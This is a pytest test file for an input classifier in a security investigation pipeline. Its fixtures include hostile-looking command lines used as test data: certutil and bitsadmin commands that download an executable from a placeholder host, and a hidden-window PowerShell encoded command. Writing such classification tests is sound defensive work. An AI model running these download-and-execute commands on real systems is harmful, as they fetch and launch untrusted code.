"""Stage 1 · Input Classification tests."""
import pytest

from nivxforge.investigation.pipeline.input_classification import (
    InputClass, classify_input,
)


def test_empty_input():
    assert classify_input("").kind == InputClass.EMPTY
    assert classify_input("   \n\t").kind == InputClass.EMPTY
    assert classify_input(None).kind == InputClass.EMPTY  # type: ignore[arg-type]


def test_json_object():
    r = classify_input('{"a":1,"b":2}')
    assert r.kind == InputClass.JSON
    assert r.confidence >= 0.9


def test_json_array():
    assert classify_input('[{"a":1},{"a":2}]').kind == InputClass.JSON


def test_ndjson():
    inp = '{"a":1}\n{"a":2}\n{"a":3}'
    assert classify_input(inp).kind == InputClass.NDJSON


def test_xml():
    inp = "<Event><EventData><Data Name='Foo'>bar</Data></EventData></Event>"
    assert classify_input(inp).kind == InputClass.XML


def test_encoded_powershell_full_line():
    r = classify_input("powershell.exe -EncodedCommand SQBFAFgAKAA=")
    assert r.kind == InputClass.ENCODED_CMD
    assert r.confidence > 0.9


def test_encoded_command_short_flag():
    assert classify_input("pwsh -enc SGVsbG8=").kind == InputClass.ENCODED_CMD


def test_standalone_base64():
    # A pure base64 blob (with newlines allowed by regex) → encoded_cmd.
    r = classify_input("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IGJhc2U2NCBibG9iIQ==")
    assert r.kind == InputClass.ENCODED_CMD
    assert "base64" in (r.hint or "")


def test_plain_command_powershell():
    r = classify_input("powershell -c Get-Process")
    assert r.kind == InputClass.PLAIN_COMMAND


def test_plain_command_cmd():
    assert classify_input("cmd.exe /c whoami").kind == InputClass.PLAIN_COMMAND


def test_plain_command_lolbin():
    assert classify_input("certutil -urlcache -f http://a.b/x.exe").kind == InputClass.PLAIN_COMMAND
    assert classify_input("bitsadmin /transfer x http://a.b/x c:\\").kind == InputClass.PLAIN_COMMAND


def test_csv():
    inp = "time,host,user,event\n1,h1,u1,e1\n2,h2,u2,e2"
    assert classify_input(inp).kind == InputClass.CSV


def test_tsv():
    inp = "time\thost\tuser\n1\th1\tu1\n2\th2\tu2"
    r = classify_input(inp)
    assert r.kind == InputClass.CSV
    assert r.hint == "tab"


def test_key_value_lines():
    inp = 'src_ip=1.2.3.4 dst_ip=5.6.7.8 protocol=tcp\nsrc_ip=9.9.9.9 dst_ip=8.8.8.8 protocol=udp'
    assert classify_input(inp).kind == InputClass.KEY_VALUE


def test_plain_text_fallback():
    assert classify_input("hello world this is prose").kind == InputClass.PLAIN_TEXT


def test_encoded_beats_plain_command():
    """Regression: PowerShell + -EncodedCommand must NOT be misclassified
    as plain_command."""
    r = classify_input("powershell -w hidden -EncodedCommand SQBFAFgAKAA=")
    assert r.kind == InputClass.ENCODED_CMD
